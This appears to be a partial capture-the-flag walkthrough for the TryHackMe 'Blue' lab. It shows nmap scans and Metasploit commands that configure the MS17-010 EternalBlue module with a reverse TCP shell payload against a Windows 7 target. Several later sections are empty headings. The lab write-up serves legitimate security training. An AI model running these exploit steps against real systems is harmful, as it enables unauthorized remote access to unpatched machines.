# 🧠 TryHackMe Room: Blue 

**Room URL:** [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)  
**Author:** Schenkee  
**Profile:** [https://tryhackme.com/p/schenkee](https://tryhackme.com/p/schenkee)  

---

## 🧩 Challenge Task Overview

**Objective:**   
This guide will cover the steps required to gain the answer to all question in the Blue room which focuses on the Eternal Blue vulnerability in SMB and is the conclusion to the Metasploit module. 

---

## 🧰 Tools I Used  
- nmap
- Metasploit
- Hashcat

---

Firstly, let’s start our target machine and give it a few minutes to start all relevant services. I am using the TryHackME AttackBox lets start this up as well, or alternatively as in my case connect to the TryHackMe VPN to use your own attacking machine. You can even download the VM for offline usage if required.

---

## 🛠️ Recon: 
First let us start with a straightforward nmap scan to see which ports are open and what possible path we have into the target machine.  

We will run nmap via the following ```sudo nmap -sS TARGET_IP```   
#### ⚙️ **Options**  
**sudo** We need to run this command as a privileged user otherwise it will perform a 3-way-handshake and be a TCP Connect Scan -sT.  
**-sS** Tells Nmap to perform a TCP SYN Scan.  

This should return the below information.  
![Recon - Nmap](./Images/Recon%20-%20Nmap.png)  
This will give us enough information to answer the first question: **How many ports are open with a port number under 1000?**  

Now we can see that port 445 is open which is the default port used for Server Message Block (SMB) protocol. SMB is the protocol which is vulnerable to Eternal Blue in certain windows versions. But let’s run another Nmap scan to see if we cannot find anything further to verify that this port is indeed vulnerable.  

We can run a nmap version scan and default scripts against the target port to see if we can return any further useful information.  

This can be done via ```sudo nmap -sS -sV -sC TARGET_IP -p 445```
#### ⚙️ **Options**  
**sudo** We need to run this command as a privileged user otherwise it will perform a 3-way-handshake and be a TCP Connect Scan -sT.  
**-sS** Tells Nmap to perform a TCP SYN Scan.   
**-sV** Tells Nmap to perform a version scan to detect service versions on each port.  
**-sC** Tells Nmap to perform run default scripts on the target.    
**-p** Tells nmap which port to scan. In this case we only need to scan port 445    

This should result in the below output.  
![Recond - Nmap -sV](./Images/Recon%20-%20Nmap%20-sV.png)  
This has returned some very good information namely the OS details. We can see that the system is running ***Windows 7 Professional 7601 Service Pack 1***

Let’s do a google search for any vulnerabilities which might be affecting smb on ***Windows 7 Professional 7601 Service Pack 1*** and as we might be expected we get some good results back confirming that our target is vulnerable to CVE-2017-0144 Eternal Blue.  
![Recond - Google](./Images/Recon%20-%20Google.png)  
We can also see some results returned on ExploitDB  
![Recond - ExploitDB](./Images/Recon%20-%20ExploitDB.png)  
This provides us the answer to the next and final question for the Recon section: ***What is this machine vulnerable to?***  

This concludes our required Reconnisance for the room and we can now move on to gain access to the target machine.

---

## 🛠️ Gain Access: 
In the Recon section we identified that the target machine is vulnerable to MS17_010 aka EternalBlue. 

So lets start up Metasploit using ```msfconsole```  

Now lets see if there are any relevant modules avaible to us via ```search ms17-010``` this will bring back the below results.  
![Gain Access - search](./Images/Gain%20Access%20-%20search.png)  
In this instance we can use the first result, to load this module type ```use 0```  

This will also now provide us with the answer to our first question in this section: **Find the exploitation code we will run against the machine. What is the full path of the code?**  

Now that we have loaded this module we will need to configure a couple of items. Firstly lets view our options via ```show options```  
![Gain Access - Initial options](./Images/Gain%20Access%20-%20Initial%20options.png)  
The items we will need to change are **RHOSTS**, **LHOST** and the **Payload**  

Do this via the following commands
```set RHOSTS TARGET_IP```
```set LHOST YOUR_MACHINE_IP```
```set payload windows/x64/shell/reverse_tcp```

Now we can view our options again via ```show options``` and confirm our remote and local host IP's are correct and that our payload has been adjusted as required.  
![Gain Access - options final](./Images/Gain%20Access%20-%20options%20final.png)




---

## 🛠️ Escalate: 


---

## 🛠️ Cracking: 


---

## 🛠️ Find flags!: 


---

## 🧠 Takeaways  
 

---

Thank you for following through my guide of the TryHackMe Blue.  
